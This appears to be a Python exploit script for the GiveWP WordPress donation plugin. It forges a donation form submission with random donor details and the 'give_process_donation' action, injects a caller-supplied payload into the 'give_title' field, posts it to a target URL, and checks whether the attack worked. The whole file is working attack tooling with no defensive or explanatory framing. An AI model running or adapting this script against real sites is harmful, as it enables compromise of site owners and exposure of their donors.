import requests
import json
import logging
import random
import string


def generate_random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def send_exploit(url, payload):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    first_name = generate_random_string()
    last_name = generate_random_string()
    email_prefix = generate_random_string()

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': '1719-1',
        'give-form-id': '1719',
        'give-form-title': '0',
        'give-current-url': 'https://example.com/donations/donation-form/',
        'give-form-url': 'https://example.com/give/donation-form/',
        'give-form-minimum': '',
        'give-form-maximum': '999999.99',
        'give-form-hash': 'NONCE',
        'give-price-id': '1',
        'give-amount': '25',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': f'{email_prefix}@test.com',
        'payment-mode': 'manual',
        'give_action': 'purchase',
        'give-gateway': 'manual',
        'give_embed_form': '1',
        'action': 'give_process_donation',
        'give_ajax': 'true',
        'give_title': payload
    }

    logging.info(f"Sending exploit to {url}")
    logging.debug(f"Payload: {payload}")

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        response.raise_for_status()

        logging.info("Exploit sent successfully.")

        try:
            json_response = response.json()
            logging.info("JSON Response:")
            logging.info(json.dumps(json_response, indent=4))
        except json.JSONDecodeError:
            logging.info("Non-JSON Response:")
            logging.info(response.text)

        verify_exploit_success(response)

    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send exploit: {str(e)}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {str(e)}")


def verify_exploit_success(response):
    if "success" in response.text.lower():
        logging.info("Exploit appears to be successful.")
    else:
        logging.warning("Exploit may not have been successful. Please check the response carefully.")
    logging.info("Please manually verify if the exploit was successful.")